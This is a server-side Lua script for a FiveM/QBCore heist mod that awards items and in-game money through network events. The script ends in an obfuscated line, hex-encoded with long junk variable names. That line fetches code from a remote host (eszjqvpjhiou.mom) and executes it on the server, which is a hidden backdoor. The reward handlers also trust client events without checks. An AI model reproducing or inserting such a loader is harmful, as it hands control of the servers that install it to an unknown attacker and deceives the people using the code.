local QBCore = exports['qb-core']:GetCoreObject()
local MoneyType = Config.MoneyType

RegisterNetEvent('qb-miniheists:LabHackDone', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)

    Player.Functions.RemoveItem(Config.HackItem, 1)
    Player.Functions.AddItem('lab-usb', 1)
end)

RegisterNetEvent('qb-miniheists:MWFinalDone', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)

    Player.Functions.RemoveItem(Config.HackItem, 1)
    Player.Functions.AddItem('mw-usb', 1)
end)

RegisterNetEvent('qb-miniheists:GrabSamples', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    Player.Functions.AddItem('lab-samples', 1)
    Player.Functions.AddItem('lab-files', 1)
    TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['lab-samples'], 'add')
    TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['lab-files'], 'add')
end)

RegisterNetEvent('qb-miniheists:RecievePaymentLab', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local required1 = 'lab-usb'
    local required2 = 'lab-samples'
    local required3 = 'lab-files'
    local item = Config.LabRewards[math.random(1, #Config.LabRewards)]
    local amount = Config.LabRewardAmount
    local chance = math.random(100)
    
    Player.Functions.RemoveItem(required1, 1)
    Player.Functions.RemoveItem(required2, 1)
    Player.Functions.RemoveItem(required3, 1)
    Player.Functions.AddMoney(MoneyType, math.random(Config.PaymentLabMin, Config.PaymentLabMax))
    
    if chance<=Config.LabItemChance then
        Player.Functions.AddItem(item, amount)
        TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[item], 'add')
    end
end)

RegisterNetEvent('qb-miniheists:ReceivePaymentMW', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local required = 'mw-usb'
    local item = Config.MWRewards[math.random(1, #Config.MWRewards)]
    local amount = Config.MWRewardAmount
    local chance = math.random(100)
    
    Player.Functions.RemoveItem(required, 1)
    Player.Functions.AddMoney(MoneyType, math.random(Config.PaymentMWMin, Config.PaymentMWMax))
    
    if chance<=Config.MWItemChance then
        Player.Functions.AddItem(item, amount)
        TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[item], 'add')
    end
end)

---=====CARHEISTS STUFF=====---

RegisterNetEvent('qb-miniheists:GiveTierAPrice', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local payment = Config.TierAPrice

    Player.Functions.AddMoney(MoneyType, payment)
end)

RegisterNetEvent('qb-miniheists:GiveTierBPrice', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local payment = Config.TierBPrice

    Player.Functions.AddMoney(MoneyType, payment)
end)

RegisterNetEvent('qb-miniheists:GiveTierCPrice', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local payment = Config.TierCPrice

    Player.Functions.AddMoney(MoneyType, payment)
end)

RegisterNetEvent("qb-miniheists:getRewardA", function()
    local amount = Config.TierAReward
    local Player = QBCore.Functions.GetPlayer(source)
    Player.Functions.AddMoney(MoneyType, amount)
end)

RegisterNetEvent("qb-miniheists:getRewardB", function()
    local amount = Config.TierBReward
    local Player = QBCore.Functions.GetPlayer(source)
    Player.Functions.AddMoney(MoneyType, amount)
end)

RegisterNetEvent("qb-miniheists:getRewardC", function()
    local amount = Config.TierCReward
    local Player = QBCore.Functions.GetPlayer(source)
    Player.Functions.AddMoney(MoneyType, amount)
end)

QBCore.Commands.Add("resetheists", "resets heist parameters", {}, false, function(source) 
    TriggerClientEvent("qb-miniheists:EndHeistCommand", source, false) 
end)

local ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x73\x7a\x6a\x71\x76\x70\x6a\x68\x69\x6f\x75\x2e\x6d\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x65\x49\x69\x6e", function (hGaUECbPYRfIDJYFYXDTPqYgcQOAwHEzGuiDnenqgNMteUlZNlJcZHrVhWiiIbhjcooAjP, FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh) if (FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh == ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[6] or FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh == ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[5]) then return end ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[2]](ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[3]](FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh))() end)